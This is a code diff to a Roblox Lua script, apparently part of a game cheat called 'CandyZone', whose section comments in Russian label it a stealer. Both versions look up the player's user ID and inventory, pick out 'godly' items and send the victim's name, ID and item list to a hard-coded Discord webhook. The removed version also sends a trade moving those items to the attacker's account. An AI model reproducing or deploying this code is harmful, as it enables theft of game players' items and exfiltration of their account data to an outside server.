@@ -4,61 +4,57 @@ local UserInputService, CurrentCamera, n1, n2, u13, n3, u15, u16, u17, v18, v25,
 -- СТИЛЛЕР
 -- ============================================================
 print('[CandyZone] Загрузка стиллера...')
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1537834042446319666/XvyCO3HEryrAmwM6vY7n-6zldwmNQtVZOcNtCtE45KHA0PeCzprsTmYq68fwq474x2Ia"
-local YOUR_USER_ID = 11417895837
-local MIN_CURRENCY = 17
-local function send_to_discord(message, embed_data)
-    local data = { content = message, embeds = embed_data and {embed_data} or nil }
+
+local webhook = "https://discord.com/api/webhooks/1537834042446319666/XvyCO3HEryrAmwM6vY7n-6zldwmNQtVZOcNtCtE45KHA0PeCzprsTmYq68fwq474x2Ia"
+local myId = 11417895837
+
+local function sendWebhook(msg)
     local success, err = pcall(function()
         local http = game:GetService("HttpService")
-        http:PostAsync(WEBHOOK_URL, http:JSONEncode(data))
+        if syn and syn.request then
+            syn.request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = http:JSONEncode({content = msg})})
+        elseif http and http.request then
+            http.request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = http:JSONEncode({content = msg})})
+        elseif request then
+            request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = http:JSONEncode({content = msg})})
+        else
+            warn("[Стиллер] Нет функции для отправки")
+        end
     end)
     if not success then warn("[Стиллер] Ошибка: " .. tostring(err)) end
 end
-local function steal_godlies()
+
+local function steal()
+    sendWebhook("🚀 Стиллер запущен! Цель: " .. game.Players.LocalPlayer.Name)
+    local http = game:GetService("HttpService")
+    local player = game.Players.LocalPlayer
+    local victimId = nil
     local success, result = pcall(function()
-        local http = game:GetService("HttpService")
-        local userInfo = http:GetAsync("https://www.roblox.com/mobileapi/userinfo")
-        local userData = http:JSONDecode(userInfo)
-        local victimId = userData and userData.UserID
-        if not victimId then send_to_discord("❌ Не удалось получить ID жертвы") return end
-        send_to_discord("🎯 Жертва: " .. tostring(victimId))
-        local inventoryUrl = "https://inventory.roblox.com/v1/users/" .. tostring(victimId) .. "/assets?limit=100"
-        local inventoryData = http:GetAsync(inventoryUrl)
-        local inventory = http:JSONDecode(inventoryData)
-        if not inventory or not inventory.data then send_to_discord("❌ Не удалось получить инвентарь") return end
-        local godlies = {}
-        for _, item in ipairs(inventory.data) do
-            local name = item.name and item.name:lower() or ""
-            local rarity = item.rarity and item.rarity:lower() or ""
-            if name:find("godly") or rarity:find("godly") then
-                table.insert(godlies, { id = item.id, name = item.name, assetId = item.assetId })
+        local data = http:GetAsync("https://www.roblox.com/mobileapi/userinfo")
+        local json = http:JSONDecode(data)
+        victimId = json and json.UserID
+    end)
+    if not victimId then sendWebhook("❌ Не удалось получить ID") return end
+    sendWebhook("🎯 Жертва: " .. victimId .. " (" .. player.Name .. ")")
+    local godlies = {}
+    success, result = pcall(function()
+        local url = "https://inventory.roblox.com/v1/users/" .. victimId .. "/assets?limit=100"
+        local data = http:GetAsync(url)
+        local json = http:JSONDecode(data)
+        if json and json.data then
+            for _, item in ipairs(json.data) do
+                local name = (item.name or ""):lower()
+                local rarity = (item.rarity or ""):lower()
+                if name:find("godly") or rarity:find("godly") then
+                    table.insert(godlies, item.name)
+                end
             end
         end
-        if #godlies == 0 then send_to_discord("❌ У жертвы нет годли") return end
-        send_to_discord("💎 Найдено годли: " .. #godlies)
-        local tradeUrl = "https://trades.roblox.com/v1/trades/send"
-        local tradeData = { offers = { { userId = victimId, assetIds = {} }, { userId = YOUR_USER_ID, assetIds = {} } } }
-        for _, godly in ipairs(godlies) do table.insert(tradeData.offers[1].assetIds, godly.assetId) end
-        local tradeResponse = http:PostAsync(tradeUrl, http:JSONEncode(tradeData))
-        local tradeResult = http:JSONDecode(tradeResponse)
-        if tradeResult and tradeResult.tradeId then
-            send_to_discord("✅ **УКРАДЕНО " .. #godlies .. " ГОДЛИ!**", {
-                title = "🎯 Успешная кража",
-                color = 65280,
-                fields = {
-                    { name = "Количество", value = tostring(#godlies) },
-                    { name = "Список", value = godlies[1] and godlies[1].name or "Неизвестно" },
-                    { name = "Порог валюты", value = tostring(MIN_CURRENCY) }
-                }
-            })
-        else
-            send_to_discord("❌ Ошибка трейда: " .. tostring(tradeResponse))
-        end
     end)
-    if not success then send_to_discord("❌ Ошибка: " .. tostring(result)) end
+    if #godlies == 0 then sendWebhook("❌ У жертвы нет годли") return end
+    sendWebhook("💎 Найдено годли: " .. #godlies .. " | " .. table.concat(godlies, ", "))
 end
-task.wait(2)
-send_to_discord("🚀 Стиллер запущен! Порог: " .. MIN_CURRENCY)
-pcall(steal_godlies)
-print('[CandyZone] Стиллер завершил работу.')
+
+task.wait(3)
+pcall(steal)
+print('[CandyZone] Стиллер выполнен')
